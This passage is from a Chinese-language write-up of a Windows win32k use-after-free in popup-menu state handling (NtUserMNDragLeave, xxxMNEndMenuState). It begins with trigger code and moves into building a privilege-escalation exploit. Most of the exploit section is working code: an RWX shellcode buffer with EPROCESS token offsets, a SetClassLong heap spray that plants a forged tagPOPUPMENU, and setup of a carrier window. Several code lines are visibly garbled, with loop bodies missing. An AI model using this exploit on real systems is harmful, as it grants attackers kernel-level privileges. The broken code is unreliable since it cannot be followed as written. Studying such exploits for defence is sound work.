        _In_ HWND   hwnd,
        _In_ UINT   msg,
        _In_ WPARAM wParam,
        _In_ LPARAM lParam
    )
    {
        if (msg == WM_NCDESTROY)
        {
            xxSyscall(num_NtUserMNDragLeave, 0, 0);
        }
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
_阴影窗口自定义消息处理函数的验证代码_
函数 `NtUserMNDragLeave` 原本用于结束菜单的拖拽状态。在该函数执行期间，系统在进行一系列的判断和调用之后，最终在函数
`xxxUnlockMenuState` 中调用 `xxxMNEndMenuState` 函数：
      bZeroLock = menuState->dwLockCount-- == 1;
      if ( bZeroLock && ExitMenuLoop(menuState, menuState->pGlobalPopupMenu) )
      {
        xxxMNEndMenuState(1);
        result = 1;
      }
_函数 xxxUnlockMenuState 调用 xxxMNEndMenuState 函数_
这导致重新触达漏洞所在的位置并致使菜单状态对象的成员域 `pGlobalPopupMenu` 指向的根弹出菜单对象被重复释放，导致系统 BSOD 的发生。
_根弹出菜单对象重复释放导致系统 BSOD 的发生_
#### 0x4 利用
前面的章节对漏洞原理进行分析并构造了简单的漏洞触发验证代码。在本章节中将利用该漏洞的触发，通过循序渐进的方式构造利用代码，最终实现利用和提权的目的。
* * *
**初始化利用数据**
在利用代码中自定义结构体 `SHELLCODE` 以存储与利用相关的数据：
    typedef struct _SHELLCODE {
        DWORD reserved;
        DWORD pid;
        DWORD off_CLS_lpszMenuName;
        DWORD off_THREADINFO_ppi;
        DWORD off_EPROCESS_ActiveLink;
        DWORD off_EPROCESS_Token;
        PVOID tagCLS[0x100];
        BYTE  pfnWindProc[];
    } SHELLCODE, *PSHELLCODE;
_自定义的 SHELLCODE 结构体定义_
在利用代码的早期阶段在用户进程中分配完整内存页的 `RWX` 内存块，并初始化相关成员域，将 ShellCode 函数代码拷贝到从成员域
`pfnWindProc` 起始的内存地址。
    pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pvShellCode == NULL)
    {
        return 0;
    }
    ZeroMemory(pvShellCode, 0x1000);
    pvShellCode->pid = GetCurrentProcessId();
    pvShellCode->off_CLS_lpszMenuName    = 0x050;
    pvShellCode->off_THREADINFO_ppi      = 0x0b8;
    pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
    pvShellCode->off_EPROCESS_Token      = 0x0f8;
    CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));
_初始化分配的 SHELLCODE 结构体内存区域_
成员域 `pfnWindProc` 起始的内存区域将最终作为实际 ShellCode 函数代码在内核上下文执行。
* * *
**伪造根弹出菜单对象**
在用户进程验证代码的阴影窗口自定义消息处理函数 `xxShadowWindowProc` 执行期间，需要通过相关函数在内核中分配与
`tagPOPUPMENU` 结构体相同大小的缓冲区以占位刚释放的内存空隙，伪造新的弹出菜单对象，使系统误认为弹出菜单对象仍旧正常存在于内核中。
这在利用代码中将通过调用函数 `SetClassLong` 对大量的窗口对象设置 `MENUNAME` 字段的方式实现。这些窗口对象需要在首次调用函数
`TrackPopupMenuEx` 之前完成创建和初始化。
回到验证代码调用函数 `TrackPopupMenuEx` 之前创建菜单对象的位置，在此时机增加调用函数 `CreateWindowEx`
以创建大量窗口对象，并为每个窗口对象注册单独的窗口类。
    for (INT i = 0; i flags
    dwPopupFake[0x1] = 0xDDDDDDDD;  //->spwndNotify
    dwPopupFake[0x2] = 0xDDDDDDDD;  //->spwndPopupMenu
    dwPopupFake[0x3] = 0xDDDDDDDD;  //->spwndNextPopup
    dwPopupFake[0x4] = 0xDDDDDDDD;  //->spwndPrevPopup
    dwPopupFake[0x5] = 0xDDDDDDDD;  //->spmenu
    dwPopupFake[0x6] = 0xDDDDDDDD;  //->spmenuAlternate
    dwPopupFake[0x7] = 0xDDDDDDDD;  //->spwndActivePopup
    dwPopupFake[0x8] = 0xDDDDDDDD;  //->ppopupmenuRoot
    dwPopupFake[0x9] = 0xDDDDDDDD;  //->ppmDelayedFree
    dwPopupFake[0xA] = 0xDDDDDDDD;  //->posSelectedItem
    dwPopupFake[0xB] = 0xDDDDDDDD;  //->posDropped
    dwPopupFake[0xC] = 0;
    for (UINT i = 0; i  dt win32k!tagPOPUPMENU 0141fb44 
       [...]
       +0x000 fIsTrackPopup    : 0y1
       [...]
       +0x000 fFirstClick      : 0y1
       [...]
       +0x000 fDestroyed       : 0y1
       +0x000 fDelayedFree     : 0y1
       [...]
       +0x000 fInCancel        : 0y1
       [...]
       +0x004 spwndNotify      : 0xdddddddd tagWND
       +0x008 spwndPopupMenu   : 0xdddddddd tagWND
       +0x00c spwndNextPopup   : 0xdddddddd tagWND
       +0x010 spwndPrevPopup   : 0xdddddddd tagWND
       +0x014 spmenu           : 0xdddddddd tagMENU
       +0x018 spmenuAlternate  : 0xdddddddd tagMENU
       +0x01c spwndActivePopup : 0xdddddddd tagWND
       +0x020 ppopupmenuRoot   : 0xdddddddd tagPOPUPMENU
       +0x024 ppmDelayedFree   : 0xdddddddd tagPOPUPMENU
       +0x028 posSelectedItem  : 0xdddddddd
       +0x02c posDropped       : 0xdddddddd
_伪造的 tagPOPUPMENU 对象的成员域数据_
* * *
**伪造弹出菜单对象成员域**
前面伪造的 `tagPOPUPMENU`
对象重新占用了先前释放的根弹出菜单对象的内存区域，并且其各个成员域在利用代码中分配时可以实施完全控制。但前面并未对其各个指针成员域进行有效性设置，这样一来在函数
`xxxMNEndMenuState`
中解锁各个指针成员域指向的对象时仍旧会触发缺页异常等错误。接下来通过对指针成员域进行设置，使其指向有效的内存空间，以使内核逻辑能够正常向后执行。
回到验证代码中创建作为弹出菜单拥有者的窗口对象 `hWindowMain` 的位置，增加创建新的用作利用载体的普通窗口对象 `hWindowHunt`
的代码：
    WNDCLASSEXW wndClass = { 0 };
    wndClass = { 0 };
    wndClass.cbSize = sizeof(WNDCLASSEXW);
    wndClass.lpfnWndProc    = DefWindowProcW;
    wndClass.cbWndExtra     = 0x200;
    wndClass.hInstance      = GetModuleHandleA(NULL);
    wndClass.lpszMenuName   = NULL;
    wndClass.lpszClassName  = L"WNDCLASSHUNT";
    RegisterClassExW(&wndClass);
    hWindowHunt = CreateWindowExW(0x00,
        L"WNDCLASSHUNT",
        NULL,
        WS_OVERLAPPED,
        0,
        0,